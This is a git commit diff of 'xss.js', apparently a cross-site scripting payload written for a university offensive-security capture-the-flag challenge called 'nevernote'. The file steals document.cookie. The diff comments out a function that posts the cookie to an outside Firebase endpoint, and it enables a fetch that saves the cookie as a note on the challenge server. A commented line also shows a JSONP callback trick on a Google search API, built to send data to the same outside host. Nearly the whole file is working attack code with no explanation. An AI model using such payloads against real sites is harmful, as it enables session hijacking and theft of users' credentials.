9e40ca48dca98bd9c4c6d8942813ac9ddc2bced0
Brendan Horng <brendan.horng@ludusamo.com>
2019-02-20 14:17:12 -0500

    json body

--- nevernote/xss.js
+++ nevernote/xss.js
@@ -3,24 +3,24 @@ formData.append('title', 'test');
 formData.append('content', document.cookie);
 formData.append('submit', 'save');
 
-function takeData(data) {
-    alert(1);
-    fetch("https://test-43d17.firebaseio.com/cookie.json", {
-        method: "POST",
-        body: JSON.stringify({cookies: document.cookie})
-    }).then(res =>{});
-}
+//function takeData(data) {
+//    alert(1);
+//    fetch("https://test-43d17.firebaseio.com/cookie.json", {
+//        method: "POST",
+//        body: JSON.stringify({cookies: document.cooki})
+//    }).then(res =>{});
+//}
 
 //fetch("https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=takeData")
 //.then(res=>{
 //
 //});
-//fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
-//    method: "POST",
-//    credentials: "same-origin",
-//    body: formData
-//}).then(res => {
-//    alert(response.json);
-//});
+fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
+    method: "POST",
+    credentials: "same-origin",
+    body: JSON.stringify({title: 'test', 'content': document.cookie, 'submit': 'save'})
+}).then(res => {
+    alert(response.json);
+});
 
 //<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=fetch('https://test-43d17.firebaseio.com/cookie.json', {method:'POST',body:JSON.stringify('test')})"></script>
